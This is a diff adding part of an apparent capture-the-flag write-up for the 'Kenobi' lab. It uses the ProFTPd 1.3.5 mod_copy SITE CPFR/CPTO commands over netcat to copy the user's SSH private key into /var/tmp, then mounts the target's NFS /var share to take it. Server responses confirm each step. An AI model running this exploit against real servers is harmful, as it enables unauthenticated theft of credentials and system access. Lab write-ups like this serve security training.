@@ -210,21 +210,37 @@ ProFTPd 1.3.5 - File Copy                                                  | lin
 --------------------------------------------------------------------------- ---------------------------------
 Shellcodes: No Results
 ```
+### As i read about The mod_copy module implements SITE CPFR and SITE CPTO commands, which can be used to copy files/directories from one place to another on the server. Any unauthenticated client can leverage these commands to copy files from any part of the filesystem to a chosen destination.
 
+### So just copy the ssh key to var
+```
+ nc 10.10.101.17 21
+```
+```
+SITE CPFR /home/kenobi/.ssh/id_rsa
+```
+```
+SITE CPTO /var/tmp/id_rsa
+```
+```
+└─$ nc 10.10.101.17 21
+220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.101.17]
+SITE CPFR /home/kenobi/.ssh/id_rsa
+350 File or directory exists, ready for destination name
+SITE CPTO /var/tmp/id_rsa
+250 Copy successful
+```
 
-
-
-
-
-
-
-
-
-
-
-
-
-
+### We knew that the /var directory was a mount,Lets mount the /var/tmp directory to our machine.
+```
+mkdir /mnt/kenobiNFS
+```
+```
+mount 10.10.101.17:/var /mnt/kenobiNFS
+```
+```
+ls -la /mnt/kenobiNFS
+```
 
 
 
